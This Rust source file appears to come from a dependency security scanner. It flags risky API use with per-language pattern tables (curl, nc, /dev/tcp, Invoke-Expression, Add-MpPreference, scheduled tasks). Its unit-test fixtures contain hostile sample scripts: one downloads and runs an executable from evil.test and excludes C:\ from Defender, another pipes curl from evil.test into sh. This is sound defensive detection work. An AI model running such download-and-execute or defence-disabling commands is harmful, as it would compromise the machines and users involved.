//! Sensitive-API surface.
//!
//! Cheap substring scan for known dangerous primitives. We deduplicate per (file, api)
//! and roll up at Low severity unless the file ALSO matched obfuscation/install-hook
//! analyzers — escalation is left to the orchestration layer in v2.

use aho_corasick::AhoCorasick;
use std::path::Path;
use std::sync::OnceLock;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

/// The shared language set — see [`util::Lang`].
pub use super::util::Lang;

/// The sensitive primitives per language. A free function rather than a method,
/// because [`Lang`] is declared in `util` and only this analyzer needs the table.
fn apis(lang: Lang) -> &'static [&'static str] {
    {
        match lang {
            Lang::JavaScript => &[
                "child_process",
                "require('fs')",
                "require(\"fs\")",
                "require('net')",
                "require(\"net\")",
                "require('dgram')",
                "require('http')",
                "require('https')",
                "require('tls')",
                ".exec(",
                ".spawn(",
                // "EtherHiding": pulling C2/config from a smart contract so no
                // exfil domain is ever hard-coded (keyv/cacheable, Aug 2026). Rare
                // outside web3 libs; a strong hint when it rides obfuscation/hooks.
                "eth_call",
                "eth_sendRawTransaction",
            ],
            Lang::Python => &[
                "import subprocess",
                "from subprocess",
                "import socket",
                "import requests",
                "from urllib",
                "os.system",
                "os.popen",
                "os.environ",
                "shutil.copy",
                "ctypes",
            ],
            Lang::Rust => &[
                "std::process",
                "std::net",
                "tokio::process",
                "reqwest::",
                "ureq::",
                "Command::new",
            ],
            Lang::Ruby => &[
                "system(",
                "exec(",
                "%x(",
                "IO.popen",
                "Open3.",
                "Net::HTTP",
                "require 'socket'",
                "require \"socket\"",
                "require 'open-uri'",
                "require \"open-uri\"",
                "Kernel.system",
            ],
            Lang::Php => &[
                "shell_exec(",
                "exec(",
                "system(",
                "passthru(",
                "proc_open(",
                "popen(",
                "pcntl_exec(",
                "curl_exec(",
                "fsockopen(",
                "fopen(\"http",
                "fopen('http",
            ],
            Lang::Go => &[
                "os/exec",
                "exec.Command",
                "exec.CommandContext",
                "os.StartProcess",
                "syscall.Exec",
                "syscall.Syscall",
                "net.Dial",
                "plugin.Open",
                "unsafe.Pointer",
            ],
            Lang::Java => &[
                "Runtime.getRuntime",
                "ProcessBuilder",
                ".exec(",
                "System.load",
                "java.net.Socket",
                "new Socket(",
                "openConnection(",
                "Class.forName",
                "ScriptEngineManager",
                "Method.invoke",
            ],
            // C / C++ — process spawning, dynamic loading, raw sockets.
            Lang::Cpp => &[
                "system(",
                "popen(",
                "posix_spawn",
                "execl",
                "execlp",
                "execle",
                "execv",
                "execvp",
                "execve",
                "dlopen(",
                "dlsym(",
                "socket(",
                "connect(",
                "CreateProcess",
                "LoadLibrary",
                "std::system",
                "mprotect(",
            ],
            // Perl — shell-out (system/exec/qx), IPC, sockets, HTTP clients.
            Lang::Perl => &[
                "system(",
                "exec(",
                "qx(",
                "qx/",
                "qx{",
                "qx!",
                "IPC::Open3",
                "IPC::Open2",
                "IO::Socket",
                "use Socket",
                "LWP::UserAgent",
                "HTTP::Tiny",
                "Net::FTP",
                "syscall(",
            ],
            // Shell - the install-hook surface: fetch-and-run, decode, escalate,
            // persist. High-value for OS-package maintainer scripts / scriptlets.
            // The surface a Chocolatey/winget install script actually uses.
            // Aliases (`iex`, `iwr`, `irm`) carry their trailing space so they
            // cannot hit inside a base64 blob or a longer identifier.
            Lang::PowerShell => &[
                "Invoke-Expression",
                "iex ",
                "Invoke-WebRequest",
                "iwr ",
                "Invoke-RestMethod",
                "irm ",
                "Net.WebClient",
                "DownloadString",
                "DownloadFile",
                "Start-Process",
                "Start-BitsTransfer",
                "System.Net.Sockets",
                "-EncodedCommand",
                "FromBase64String",
                // Turning the machine's own defences down.
                "Set-ExecutionPolicy",
                "Add-MpPreference",
                "Set-MpPreference",
                // Persistence and privilege.
                "Register-ScheduledTask",
                "schtasks",
                "New-Service",
                "New-ItemProperty",
                "Get-Credential",
                "ConvertTo-SecureString",
            ],
            Lang::Shell => &[
                "curl ",
                "wget ",
                "/dev/tcp/",
                "nc ",
                "ncat ",
                "eval ",
                "base64 -d",
                "base64 --decode",
                "chmod +x",
                "chmod 777",
                "crontab",
                "systemctl enable",
                "launchctl load",
                "useradd",
                "iptables",
            ],
            // Lua - RPM/dnf scriptlets and embedded interpreters.
            Lang::Lua => &[
                "os.execute",
                "io.popen",
                "os.getenv",
                "loadstring",
                "package.loadlib",
                "require('socket')",
                "require(\"socket\")",
                "ffi.",
                "posix.",
                "os.remove",
            ],
        }
    }
}

fn automaton(lang: Lang) -> &'static AhoCorasick {
    static AC: [OnceLock<AhoCorasick>; Lang::ALL.len()] =
        [const { OnceLock::new() }; Lang::ALL.len()];
    AC[lang as usize].get_or_init(|| util::automaton(apis(lang)))
}

/// One pass over `text` for the whole table (it was one `contains` per API).
pub fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>, lang: Lang) {
    let counts = util::needle_counts(automaton(lang), text);
    let mut apis: Vec<&str> = apis(lang)
        .iter()
        .zip(counts)
        .filter(|&(_, n)| n > 0)
        .map(|(&api, _)| api)
        .collect();
    if apis.is_empty() {
        return;
    }
    let dep = util::owner(path, "<project>");
    apis.sort();
    let severity = if apis.len() >= 3 {
        Severity::Medium
    } else {
        Severity::Low
    };
    out.push(Finding {
        dependency: dep,
        severity,
        category: Category::SensitiveApi,
        detail: format!("uses {}", apis.join(", ")),
        location: Some(path.display().to_string()),
        evidence: None,
        enrich_url: None,
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_one(file: &str, content: &str, lang: Lang) -> Vec<Finding> {
        let mut out = Vec::new();
        scan_text(std::path::Path::new(file), content, &mut out, lang);
        out
    }

    /// A repeated API would be reported twice; the `HashSet` this replaced
    /// used to hide that.
    #[test]
    fn api_tables_have_no_duplicates() {
        for &lang in Lang::ALL {
            let mut v = apis(lang).to_vec();
            v.sort();
            v.dedup();
            assert_eq!(v.len(), apis(lang).len(), "{lang:?}");
        }
    }

    /// `exec(` sits inside `.exec(`: both are reported, as two `contains` did.
    #[test]
    fn overlapping_needles_both_count() {
        let f = scan_one("a.java", "Runtime.getRuntime().exec(cmd)", Lang::Java);
        assert_eq!(f[0].detail, "uses .exec(, Runtime.getRuntime");
        let f = scan_one("a.c", "execvp(a); execve(b)", Lang::Cpp);
        assert_eq!(f[0].detail, "uses execv, execve, execvp");
    }

    #[test]
    fn flags_c_family_primitives() {
        let f = scan_one(
            "x.c",
            "int main(){ system(\"id\"); void* h = dlopen(\"x.so\", 0); }",
            Lang::Cpp,
        );
        let detail = &f[0].detail;
        assert!(detail.contains("system("), "{detail}");
        assert!(detail.contains("dlopen("), "{detail}");
    }

    /// A Chocolatey package IS a PowerShell script, so `.ps1` has to be a
    /// scanned extension — before this it was not, and every choco install
    /// script came back clean because nothing ever opened it.
    #[test]
    fn flags_powershell_install_script_primitives() {
        let f = scan_one(
            "chocolateyInstall.ps1",
            "$u='http://evil.test/x.exe'\n\
             (New-Object Net.WebClient).DownloadFile($u,'x.exe')\n\
             Start-Process 'x.exe'\n\
             Add-MpPreference -ExclusionPath 'C:\\'\n\
             Register-ScheduledTask -TaskName boot\n",
            Lang::PowerShell,
        );
        assert!(!f.is_empty(), "a .ps1 must be scanned at all");
        let d = &f[0].detail;
        assert!(d.contains("Net.WebClient"), "{d}");
        assert!(d.contains("Start-Process"), "{d}");
        assert!(d.contains("Add-MpPreference"), "{d}");
        assert!(d.contains("Register-ScheduledTask"), "{d}");
    }

    /// The short aliases carry a trailing space so they cannot match inside a
    /// base64 blob or a longer word.
    #[test]
    fn powershell_aliases_do_not_match_inside_words() {
        let clean = scan_one(
            "quiet.ps1",
            "$wireless = 'iwrx'\n$prefix = 'irmware'\nWrite-Output $wireless\n",
            Lang::PowerShell,
        );
        assert!(clean.is_empty(), "got {clean:?}");

        let real = scan_one("real.ps1", "iwr https://x.test/a.ps1\n", Lang::PowerShell);
        assert!(!real.is_empty());
    }

    #[test]
    fn flags_shell_and_lua_primitives() {
        let sh = scan_one(
            "hook.sh",
            "#!/bin/sh\ncurl http://evil.test/x | sh\nchmod +x /tmp/x\neval \"$PAYLOAD\"\n",
            Lang::Shell,
        );
        let d = &sh[0].detail;
        assert!(d.contains("curl "), "{d}");
        assert!(d.contains("chmod +x"), "{d}");
        assert!(d.contains("eval "), "{d}");

        let lua = scan_one(
            "s.lua",
            "os.execute('id')\nlocal f = loadstring(payload)\n",
            Lang::Lua,
        );
        let d = &lua[0].detail;
        assert!(d.contains("os.execute"), "{d}");
        assert!(d.contains("loadstring"), "{d}");
    }

    #[test]
    fn flags_perl_primitives() {
        let f = scan_one(
            "x.pl",
            "my $o = qx/id/;\nsystem('curl http://x');\nuse IO::Socket;\n",
            Lang::Perl,
        );
        let detail = &f[0].detail;
        assert!(detail.contains("qx/"), "{detail}");
        assert!(detail.contains("system("), "{detail}");
        assert!(detail.contains("IO::Socket"), "{detail}");
    }
}
